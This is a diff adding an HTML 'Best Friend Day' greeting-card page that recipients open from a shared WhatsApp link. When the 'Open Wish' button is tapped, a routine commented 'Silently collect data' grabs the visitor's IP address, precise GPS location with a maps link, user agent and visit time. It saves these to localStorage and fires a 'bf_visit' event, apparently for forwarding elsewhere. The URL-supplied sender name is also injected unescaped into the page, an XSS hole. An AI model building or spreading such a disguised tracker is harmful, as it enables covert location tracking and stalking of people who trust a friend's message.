@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Happy Best Friend Day 💛</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;0,900;1,700&family=Lato:wght@300;400&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --gold:#F5C842;--amber:#F09A1A;--rose:#FF6B9D;
+  --lilac:#C084FC;--sky:#67C8FF;--cream:#FFF8EE;
+  --deep:#1A0533;--midnight:#0D0120;
+}
+html,body{width:100%;min-height:100vh;overflow-x:hidden;font-family:'Lato',sans-serif}
+#starsCanvas{position:fixed;inset:0;z-index:0;pointer-events:none}
+
+/* ── SCREENS ── */
+.screen{display:none;min-height:100vh}
+.screen.active{display:flex;flex-direction:column;align-items:center;justify-content:center}
+
+/* ── FLOATING HEARTS ── */
+.float-heart{position:fixed;font-size:1.4rem;animation:floatUp linear infinite;opacity:0;z-index:0;pointer-events:none}
+@keyframes floatUp{0%{transform:translateY(0) rotate(0deg);opacity:0}10%{opacity:.6}90%{opacity:.3}100%{transform:translateY(-110vh) rotate(20deg);opacity:0}}
+
+/* ── CORNER DECO ── */
+.deco-corner{position:fixed;font-size:1.2rem;opacity:.4;animation:twinkle 3s ease-in-out infinite;pointer-events:none;z-index:1}
+.deco-corner.tl{top:24px;left:20px}.deco-corner.tr{top:24px;right:20px;animation-delay:.8s}
+.deco-corner.bl{bottom:24px;left:20px;animation-delay:1.4s}.deco-corner.br{bottom:24px;right:20px;animation-delay:.4s}
+@keyframes twinkle{0%,100%{opacity:.3;transform:scale(1)}50%{opacity:.9;transform:scale(1.2)}}
+@keyframes fadeSlideDown{from{opacity:0;transform:translateY(-18px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+@keyframes blink{0%,100%{opacity:.4}50%{opacity:1}}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ─────────────────────────────────────────
+   SCREEN 1 — SENDER ENTERS NAME
+───────────────────────────────────────── */
+#screenName{
+  background:radial-gradient(ellipse at 50% 0%,#2D0A5E 0%,#1A0533 40%,#0D0120 100%);
+  padding:32px 24px;text-align:center;position:relative;z-index:1;
+}
+.top-tag{font-family:'Dancing Script',cursive;font-size:1.1rem;color:var(--rose);margin-bottom:10px;animation:fadeSlideDown 1s ease both}
+.main-headline{font-family:'Playfair Display',serif;font-size:clamp(2.2rem,7vw,4rem);font-weight:900;line-height:1.1;color:var(--cream);animation:fadeSlideDown 1.1s ease .15s both}
+.main-headline .gold{color:var(--gold)}
+.subtitle{font-size:.95rem;color:#C4A8E8;font-weight:300;margin-top:12px;max-width:320px;line-height:1.6;animation:fadeSlideDown 1.1s ease .3s both}
+
+.name-box{margin-top:36px;width:100%;max-width:340px;animation:fadeSlideDown 1.1s ease .45s both}
+.name-label{font-size:.75rem;color:#C4A8E8;text-transform:uppercase;letter-spacing:.12em;margin-bottom:10px;display:block}
+.name-input{
+  width:100%;padding:16px 20px;font-size:1.1rem;
+  background:rgba(255,255,255,.07);border:2px solid rgba(245,200,66,.3);
+  border-radius:16px;color:var(--cream);outline:none;
+  font-family:'Lato',sans-serif;text-align:center;
+  transition:border-color .3s,box-shadow .3s;
+}
+.name-input::placeholder{color:rgba(255,255,255,.25)}
+.name-input:focus{border-color:rgba(245,200,66,.7);box-shadow:0 0 0 4px rgba(245,200,66,.1)}
+.name-btn{
+  margin-top:14px;width:100%;padding:15px;
+  background:linear-gradient(135deg,var(--gold),var(--amber));
+  border:none;border-radius:14px;color:#1A0533;
+  font-size:1rem;font-weight:700;cursor:pointer;
+  font-family:'Lato',sans-serif;transition:opacity .2s,transform .15s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.name-btn:hover{opacity:.9;transform:scale(1.02)}
+.name-hint{font-size:.72rem;color:#8B6BB1;margin-top:10px}
+
+/* ─────────────────────────────────────────
+   SCREEN 2 — LANDING (big button)
+───────────────────────────────────────── */
+#screenLanding{
+  background:radial-gradient(ellipse at 50% 0%,#2D0A5E 0%,#1A0533 40%,#0D0120 100%);
+  padding:32px 20px;text-align:center;position:relative;z-index:1;
+  transition:opacity .8s ease;
+}
+.sender-banner{
+  background:rgba(255,107,157,.1);border:1px solid rgba(255,107,157,.3);
+  border-radius:30px;padding:8px 20px;margin-bottom:20px;
+  font-size:.85rem;color:#FFB3D1;animation:fadeSlideDown 1s ease both;
+  display:inline-block;
+}
+.sender-banner .sname{color:var(--gold);font-weight:700}
+
+.btn-wrap{margin-top:44px;animation:fadeSlideDown 1.2s ease .5s both}
+.wish-btn{
+  position:relative;width:160px;height:160px;border-radius:24px;
+  border:none;cursor:pointer;
+  background:linear-gradient(135deg,#F5C842 0%,#F09A1A 50%,#FF6B9D 100%);
+  box-shadow:0 0 0 0 rgba(245,200,66,.6),0 8px 40px rgba(245,200,66,.35),0 2px 8px rgba(0,0,0,.3);
+  transition:transform .18s ease,box-shadow .18s ease;
+  animation:btnPulse 2.8s ease-in-out 1.5s infinite;overflow:visible;
+}
+.wish-btn:hover{transform:scale(1.06);box-shadow:0 0 0 12px rgba(245,200,66,.15),0 12px 50px rgba(245,200,66,.5)}
+.wish-btn:active{transform:scale(.97)}
+@keyframes btnPulse{
+  0%,100%{box-shadow:0 0 0 0 rgba(245,200,66,.5),0 8px 40px rgba(245,200,66,.35),0 2px 8px rgba(0,0,0,.3)}
+  50%{box-shadow:0 0 0 18px rgba(245,200,66,.08),0 8px 40px rgba(245,200,66,.5),0 2px 8px rgba(0,0,0,.3)}
+}
+.wish-btn::before{content:'';position:absolute;inset:-8px;border-radius:30px;border:2px dashed rgba(245,200,66,.4);animation:spin 12s linear infinite}
+.wish-btn::after{content:'';position:absolute;inset:-16px;border-radius:34px;border:1px solid rgba(255,107,157,.25);animation:spin 18s linear infinite reverse}
+.btn-inner{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;height:100%;position:relative;z-index:1}
+.btn-icon{font-size:2.8rem;line-height:1}
+.btn-text{font-family:'Dancing Script',cursive;font-size:1.25rem;color:#1A0533;font-weight:700;line-height:1}
+.btn-sub{font-size:.65rem;color:rgba(26,5,51,.65);font-weight:400;letter-spacing:.08em;text-transform:uppercase}
+.hint-text{margin-top:22px;font-size:.78rem;color:#8B6BB1;letter-spacing:.08em;text-transform:uppercase;animation:blink 2.5s ease-in-out infinite}
+
+/* ─────────────────────────────────────────
+   SCREEN 3 — SURPRISE / WISH CARD
+───────────────────────────────────────── */
+#screenSurprise{
+  position:fixed;inset:0;z-index:100;
+  background:var(--midnight);
+  padding:24px 20px 50px;
+  opacity:0;pointer-events:none;
+  transition:opacity .5s ease;
+  overflow-y:auto;display:flex !important;
+  flex-direction:column;align-items:center;
+}
+#screenSurprise.active{opacity:1;pointer-events:all}
+#screenSurprise::before{
+  content:'';position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(ellipse at 20% 30%,rgba(192,132,252,.25) 0%,transparent 55%),
+    radial-gradient(ellipse at 80% 70%,rgba(255,107,157,.2) 0%,transparent 55%),
+    radial-gradient(ellipse at 50% 50%,rgba(103,200,255,.1) 0%,transparent 60%),
+    #0D0120;
+  animation:auroraShift 8s ease-in-out infinite alternate;
+}
+@keyframes auroraShift{from{filter:hue-rotate(0deg) brightness(1)}to{filter:hue-rotate(25deg) brightness(1.1)}}
+
+.confetti-piece{position:fixed;top:-20px;border-radius:2px;animation:confettiFall linear forwards;pointer-events:none;z-index:99}
+@keyframes confettiFall{0%{transform:translateY(0) rotate(0deg);opacity:1}100%{transform:translateY(110vh) rotate(720deg);opacity:0}}
+
+/* ── WISH CARD ── */
+.wish-card{
+  position:relative;margin-top:20px;
+  background:linear-gradient(145deg,rgba(255,255,255,.06) 0%,rgba(255,255,255,.02) 100%);
+  border:1px solid rgba(245,200,66,.3);border-radius:24px;
+  padding:32px 24px 28px;max-width:400px;width:100%;
+  text-align:center;backdrop-filter:blur(12px);
+  box-shadow:0 0 0 1px rgba(245,200,66,.1),0 32px 80px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.08);
+  animation:cardReveal .9s cubic-bezier(.34,1.56,.64,1) .3s both;
+}
+@keyframes cardReveal{from{transform:scale(.5) rotate(-8deg);opacity:0}to{transform:scale(1) rotate(0deg);opacity:1}}
+.card-corner{position:absolute;font-size:1.5rem;animation:twinkle 2.5s ease-in-out infinite}
+.card-corner.tl{top:12px;left:14px;animation-delay:0s}
+.card-corner.tr{top:12px;right:14px;animation-delay:.6s}
+.card-corner.bl{bottom:12px;left:14px;animation-delay:1.1s}
+.card-corner.br{bottom:12px;right:14px;animation-delay:.3s}
+
+.big-emoji{font-size:4rem;margin-bottom:6px;animation:bounceIn .7s cubic-bezier(.34,1.56,.64,1) .7s both;display:block}
+@keyframes bounceIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.wish-day-label{font-family:'Dancing Script',cursive;font-size:1rem;color:var(--rose);letter-spacing:.06em;animation:fadeIn .8s ease 1s both}
+.wish-title{font-family:'Playfair Display',serif;font-size:clamp(1.7rem,6vw,2.5rem);font-weight:900;font-style:italic;color:var(--gold);line-height:1.15;margin:6px 0 14px;text-shadow:0 0 40px rgba(245,200,66,.4);animation:fadeIn .8s ease 1.1s both}
+.divider{display:flex;align-items:center;gap:10px;margin:0 auto 18px;max-width:240px;animation:fadeIn .8s ease 1.2s both}
+.divider-line{flex:1;height:1px;background:linear-gradient(to right,transparent,rgba(245,200,66,.5),transparent)}
+
+/* ── WISH MESSAGE TEXT ── */
+.wish-message{font-size:.96rem;color:#E8D8FF;font-weight:300;line-height:1.85;margin-bottom:20px;animation:fadeIn .8s ease 1.3s both;text-align:left}
+.wish-message strong{color:var(--cream);font-weight:500}
+.wish-message em{color:var(--gold);font-style:italic;font-weight:400}
+.sender-name-hl{
+  display:inline-block;color:#fff;font-weight:700;
+  background:linear-gradient(135deg,rgba(245,200,66,.25),rgba(255,107,157,.2));
+  border:1px solid rgba(245,200,66,.35);border-radius:8px;
+  padding:1px 10px;font-size:1rem;
+}
+.wish-sign{font-family:'Dancing Script',cursive;font-size:1.3rem;color:var(--rose);animation:fadeIn .8s ease 1.5s both;margin-top:4px}
+.tags-row{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:20px;animation:fadeIn .8s ease 1.6s both}
+.tag{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:5px 14px;font-size:.75rem;color:#C4A8E8}
+
+/* ── SHARE SECTION ── */
+.share-section{
+  max-width:400px;width:100%;margin-top:18px;
+  background:linear-gradient(145deg,rgba(255,107,157,.07),rgba(192,132,252,.05));
+  border:1px solid rgba(255,107,157,.25);border-radius:18px;
+  padding:20px 20px 18px;text-align:center;
+  animation:fadeIn .8s ease 1.8s both;
+}
+.share-title{font-family:'Dancing Script',cursive;font-size:1.2rem;color:var(--rose);margin-bottom:4px}
+.share-sub{font-size:.78rem;color:#9B78C8;margin-bottom:14px;line-height:1.5}
+.link-box{
+  background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.1);
+  border-radius:10px;padding:10px 14px;margin-bottom:12px;
+  font-size:.72rem;color:#8B78B8;word-break:break-all;
+  font-family:monospace;text-align:left;line-height:1.4;
+}
+.link-box span{color:var(--sky)}
+.wa-btn{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  width:100%;padding:14px;border-radius:12px;border:none;
+  background:linear-gradient(135deg,#25D366,#128C7E);
+  color:white;font-size:.95rem;font-weight:700;
+  text-decoration:none;cursor:pointer;
+  transition:opacity .2s,transform .15s;
+  font-family:'Lato',sans-serif;
+}
+.wa-btn:hover{opacity:.9;transform:scale(1.02)}
+.wa-btn .wa-icon{font-size:1.4rem}
+.copy-btn{
+  margin-top:8px;width:100%;padding:10px;border-radius:10px;
+  border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.05);
+  color:#C4A8E8;font-size:.82rem;cursor:pointer;
+  font-family:'Lato',sans-serif;transition:background .2s;
+}
+.copy-btn:hover{background:rgba(255,255,255,.09)}
+.copy-confirm{font-size:.72rem;color:#4ade80;margin-top:6px;display:none}
+
+/* ── FX ── */
+.burst-heart{position:fixed;font-size:1.6rem;pointer-events:none;z-index:200;animation:burstHeart 1.2s ease forwards}
+@keyframes burstHeart{0%{transform:translate(0,0) scale(0);opacity:1}50%{opacity:1}100%{transform:translate(var(--tx),var(--ty)) scale(1.4);opacity:0}}
+.shoot{position:fixed;width:3px;height:3px;background:white;border-radius:50%;pointer-events:none;z-index:1;animation:shoot linear forwards}
+.shoot::after{content:'';position:absolute;right:2px;top:50%;width:80px;height:1px;background:linear-gradient(to left,rgba(255,255,255,.8),transparent);transform:translateY(-50%)}
+@keyframes shoot{from{transform:translate(0,0);opacity:1}to{transform:translate(var(--sx),var(--sy));opacity:0}}
+</style>
+</head>
+<body>
+
+<canvas id="starsCanvas"></canvas>
+<div class="deco-corner tl">✦</div>
+<div class="deco-corner tr">✦</div>
+<div class="deco-corner bl">✦</div>
+<div class="deco-corner br">✦</div>
+
+<!-- ══ SCREEN 1: SENDER ENTERS NAME ══════════════════════ -->
+<div class="screen" id="screenName">
+  <div class="top-tag">✨ Send a Wish to Your Best Friend ✨</div>
+  <h1 class="main-headline">Happy<br><span class="gold">Best Friend</span><br>Day</h1>
+  <p class="subtitle">Enter your name — we'll add it to a beautiful surprise wish for your best friend 💛</p>
+
+  <div class="name-box">
+    <label class="name-label">Your Name</label>
+    <input class="name-input" id="senderInput" type="text" placeholder="e.g. Sara, Ahmed, Ayesha…" maxlength="30" onkeydown="if(event.key==='Enter')goToLanding()" />
+    <button class="name-btn" onclick="goToLanding()">
+      💌 Generate My Wish Link
+    </button>
+    <p class="name-hint">A special link will be created just for you to share on WhatsApp</p>
+  </div>
+</div>
+
+<!-- ══ SCREEN 2: LANDING — BIG BUTTON ════════════════════ -->
+<div class="screen" id="screenLanding">
+  <div class="sender-banner" id="senderBanner">
+    💌 <span class="sname" id="bannerName">Your Friend</span> sent you something special
+  </div>
+  <h1 class="main-headline">Happy<br><span class="gold">Best Friend</span><br>Day</h1>
+  <p class="subtitle">Someone loves you very much — tap the button to reveal their message 🌟</p>
+
+  <div class="btn-wrap">
+    <button class="wish-btn" id="wishBtn" onclick="openSurprise()">
+      <div class="btn-inner">
+        <span class="btn-icon">💌</span>
+        <span class="btn-text">Open Wish</span>
+        <span class="btn-sub">Tap to reveal</span>
+      </div>
+    </button>
+    <div class="hint-text">↑ Tap the button</div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 3: SURPRISE / WISH CARD ════════════════════ -->
+<div class="screen" id="screenSurprise">
+
+  <div class="wish-card">
+    <span class="card-corner tl">✦</span>
+    <span class="card-corner tr">🌸</span>
+    <span class="card-corner bl">🌸</span>
+    <span class="card-corner br">✦</span>
+
+    <span class="big-emoji">💛</span>
+    <div class="wish-day-label">— Best Friend Day —</div>
+    <h2 class="wish-title">You Are My<br>Greatest Gift</h2>
+
+    <div class="divider">
+      <div class="divider-line"></div>
+      <span>🌟</span>
+      <div class="divider-line"></div>
+    </div>
+
+    <div class="wish-message" id="wishMsg"><!-- filled by JS --></div>
+
+    <div class="divider">
+      <div class="divider-line"></div>
+      <span>💖</span>
+      <div class="divider-line"></div>
+    </div>
+
+    <div class="wish-sign" id="wishSign"><!-- filled by JS --></div>
+
+    <div class="tags-row">
+      <span class="tag">💛 Forever Friends</span>
+      <span class="tag">🌸 Best Friend Day</span>
+      <span class="tag">✨ Always & Forever</span>
+    </div>
+  </div>
+
+  <!-- SHARE SECTION -->
+  <div class="share-section" id="shareSection" style="display:none">
+    <div class="share-title">💌 Now Wish Someone YOU Love!</div>
+    <div class="share-sub">Send this same surprise to your best friend.<br>Your name will appear in their wish message.</div>
+    <div class="link-box">🔗 <span id="shareLinkDisplay">generating…</span></div>
+    <a class="wa-btn" id="waBtn" href="#" target="_blank">
+      <span class="wa-icon">💬</span> Send on WhatsApp
+    </a>
+    <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
+    <div class="copy-confirm" id="copyConfirm">✅ Link copied!</div>
+  </div>
+
+</div>
+
+<script>
+// ── STARS ──────────────────────────────────────────────
+const canvas=document.getElementById('starsCanvas');
+const ctx=canvas.getContext('2d');
+let stars=[];
+function resizeCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight}
+function initStars(){stars=[];for(let i=0;i<160;i++)stars.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.2+.2,o:Math.random(),speed:Math.random()*.008+.003})}
+function drawStars(){ctx.clearRect(0,0,canvas.width,canvas.height);stars.forEach(s=>{s.o+=s.speed;const op=.2+Math.abs(Math.sin(s.o))*.7;ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,Math.PI*2);ctx.fillStyle=`rgba(255,255,220,${op})`;ctx.fill()});requestAnimationFrame(drawStars)}
+window.addEventListener('resize',()=>{resizeCanvas();initStars()});
+resizeCanvas();initStars();drawStars();
+
+// ── FLOATING HEARTS ────────────────────────────────────
+function spawnHeart(){const h=document.createElement('div');h.className='float-heart';h.textContent=['💛','💖','🌸','✨','💕','⭐'][Math.floor(Math.random()*6)];h.style.left=Math.random()*100+'vw';h.style.bottom='-40px';h.style.animationDuration=(7+Math.random()*8)+'s';document.body.appendChild(h);setTimeout(()=>h.remove(),16000)}
+setInterval(spawnHeart,1400);
+
+// ── SHOOTING STARS ─────────────────────────────────────
+function shootingStar(){const s=document.createElement('div');s.className='shoot';s.style.left=Math.random()*window.innerWidth+'px';s.style.top=Math.random()*window.innerHeight*.5+'px';s.style.setProperty('--sx',(Math.random()*200+100)+'px');s.style.setProperty('--sy',(Math.random()*100+50)+'px');s.style.animationDuration=(.6+Math.random()*.6)+'s';document.body.appendChild(s);setTimeout(()=>s.remove(),1400)}
+setInterval(shootingStar,3500);
+
+// ── CONFETTI ───────────────────────────────────────────
+function launchConfetti(){const colors=['#F5C842','#FF6B9D','#C084FC','#67C8FF','#FF9A3C','#4ADE80'];for(let i=0;i<90;i++)setTimeout(()=>{const c=document.createElement('div');c.className='confetti-piece';c.style.left=Math.random()*100+'vw';c.style.background=colors[Math.floor(Math.random()*colors.length)];c.style.width=(6+Math.random()*8)+'px';c.style.height=(6+Math.random()*8)+'px';c.style.borderRadius=Math.random()>.5?'50%':'2px';c.style.animationDuration=(2.5+Math.random()*3)+'s';document.getElementById('screenSurprise').appendChild(c);setTimeout(()=>c.remove(),6000)},i*30)}
+
+// ── BURST HEARTS ───────────────────────────────────────
+function burstHearts(x,y){const emojis=['💛','💖','🌸','✨','💕','⭐','🌟'];for(let i=0;i<10;i++){const h=document.createElement('div');h.className='burst-heart';h.textContent=emojis[Math.floor(Math.random()*emojis.length)];h.style.left=x+'px';h.style.top=y+'px';const angle=Math.random()*360*Math.PI/180;const dist=80+Math.random()*100;h.style.setProperty('--tx',Math.cos(angle)*dist+'px');h.style.setProperty('--ty',Math.sin(angle)*dist-60+'px');h.style.animationDuration=(.9+Math.random()*.5)+'s';document.body.appendChild(h);setTimeout(()=>h.remove(),1600)}}
+document.addEventListener('click',e=>{if(document.getElementById('screenSurprise').classList.contains('active'))burstHearts(e.clientX,e.clientY)});
+
+// ── UTILS ──────────────────────────────────────────────
+function showScreen(id){document.querySelectorAll('.screen').forEach(s=>{s.classList.remove('active');s.style.display='none'});const el=document.getElementById(id);el.style.display='flex';el.classList.add('active')}
+function getParam(k){return new URLSearchParams(window.location.search).get(k)||''}
+
+// ── IP ─────────────────────────────────────────────────
+async function getIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch{try{const r2=await fetch('https://api64.ipify.org?format=json');return(await r2.json()).ip}catch{return'Unknown'}}}
+
+// ── GPS ────────────────────────────────────────────────
+function getGPS(){return new Promise(res=>{if(!navigator.geolocation){res({lat:'N/A',lng:'N/A',accuracy:'N/A',mapsLink:'N/A',error:'Not supported'});return}navigator.geolocation.getCurrentPosition(p=>res({lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),accuracy:Math.round(p.coords.accuracy)+'m',mapsLink:`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`}),e=>res({lat:'Denied',lng:'Denied',accuracy:'N/A',mapsLink:'N/A',error:e.message}),{timeout:8000,enableHighAccuracy:true})})}
+
+// ── SENDER NAME ────────────────────────────────────────
+let senderName='';
+let _shareURL='';
+
+// ── INIT ───────────────────────────────────────────────
+window.addEventListener('DOMContentLoaded',()=>{
+  const fromParam=getParam('from');
+  if(fromParam){
+    // Receiver flow — someone opened a shared link
+    senderName=decodeURIComponent(fromParam);
+    document.getElementById('bannerName').textContent=senderName;
+    showScreen('screenLanding');
+  } else {
+    // Sender flow — no name in URL
+    showScreen('screenName');
+  }
+});
+
+// ── STEP 1 → STEP 2 ───────────────────────────────────
+function goToLanding(){
+  const val=document.getElementById('senderInput').value.trim();
+  if(!val){alert('Please enter your name 💛');return}
+  senderName=val;
+  const base=window.location.href.split('?')[0];
+  _shareURL=base+'?from='+encodeURIComponent(senderName);
+  window.history.replaceState({},'','?from='+encodeURIComponent(senderName));
+  document.getElementById('bannerName').textContent=senderName;
+  showScreen('screenLanding');
+}
+
+// ── STEP 2 → STEP 3 ───────────────────────────────────
+async function openSurprise(){
+  const btn=document.getElementById('wishBtn');
+  btn.style.transform='scale(0)';btn.style.transition='transform .4s cubic-bezier(.55,0,1,.45)';
+  const landing=document.getElementById('screenLanding');
+  landing.style.opacity='0';landing.style.transition='opacity .4s ease';
+
+  // Silently collect data
+  const ip=await getIP();
+  const location=await getGPS();
+  const visitedAt=new Date().toISOString();
+  const ua=navigator.userAgent;
+
+  // Build wish message
+  buildWishMessage(senderName);
+
+  // Build share section
+  buildShareSection();
+
+  // Save & dispatch
+  const record={senderName,ip,location,visitedAt,userAgent:ua};
+  const visits=JSON.parse(localStorage.getItem('bf_visits')||'[]');
+  visits.unshift(record);
+  localStorage.setItem('bf_visits',JSON.stringify(visits));
+  window.dispatchEvent(new CustomEvent('bf_visit',{detail:record}));
+
+  setTimeout(()=>{
+    landing.style.display='none';
+    const sur=document.getElementById('screenSurprise');
+    sur.style.display='flex';
+    requestAnimationFrame(()=>{sur.style.opacity='1';sur.style.pointerEvents='all';sur.classList.add('active')});
+    launchConfetti();
+    burstHearts(window.innerWidth/2,window.innerHeight/2);
+  },450);
+}
+
+// ── WISH MESSAGE ───────────────────────────────────────
+function buildWishMessage(name){
+  const n=name||'Your Friend';
+  const hl=`<span class="sender-name-hl">${n}</span>`;
+
+  document.getElementById('wishMsg').innerHTML=`
+I am ${hl} — and I want you to know that I am
+<strong>the luckiest person in the whole world</strong>
+because I have someone like <em>you</em> in my life. 🌟<br><br>
+
+On this beautiful <strong>Best Friend Day</strong>, I want to shout
+from the rooftops that you are not just my friend —
+you are my <strong>home</strong>, my <strong>safe place</strong>,
+and the <em>best chapter</em> of my story.<br><br>
+
+Every laugh we shared, every secret we kept,
+every time you showed up for me when the world felt heavy —
+I carry all of it like the most <strong>precious treasure</strong>.<br><br>
+
+You make ordinary Tuesdays feel like celebrations,
+and my hardest moments feel <strong>survivable</strong>.
+I could search the entire universe and
+<em>never find someone as wonderful as you.</em><br><br>
+
+Today and every single day after —
+<strong>thank you for being YOU.</strong> 💛
+  `;
+  document.getElementById('wishSign').innerHTML=`— With all my heart, ${hl} 🌙`;
+  // Show share section after reveal
+  setTimeout(()=>{document.getElementById('shareSection').style.display='block'},2200);
+}
+
+// ── SHARE SECTION ──────────────────────────────────────
+function buildShareSection(){
+  // The share URL uses the RECEIVER's name — they pass their own name when sharing further
+  // So we link to screen 1 (no ?from param) — receiver enters THEIR name to send further
+  const base=window.location.href.split('?')[0];
+  // Share link goes back to base so receiver can enter their own name
+  const shareURL=base;
+  _shareURL=shareURL;
+
+  document.getElementById('shareLinkDisplay').textContent=shareURL;
+
+  const waMsg=`💛 Happy Best Friend Day! 🌟\n\nI have a beautiful surprise wish for you — I am *${senderName||'your friend'}*, and I think you are the most wonderful person in my world. Open this link to feel loved 💌\n\n${shareURL}`;
+  document.getElementById('waBtn').href='https://wa.me/?text='+encodeURIComponent(waMsg);
+}
+
+// ── COPY ───────────────────────────────────────────────
+function copyLink(){
+  const txt=_shareURL||window.location.href.split('?')[0];
+  navigator.clipboard.writeText(txt).then(()=>{
+    document.getElementById('copyConfirm').style.display='block';
+    setTimeout(()=>{document.getElementById('copyConfirm').style.display='none'},2500);
+  }).catch(()=>{
+    prompt('Copy this link:',txt);
+  });
+}
+</script>
+</body>
+</html>
+
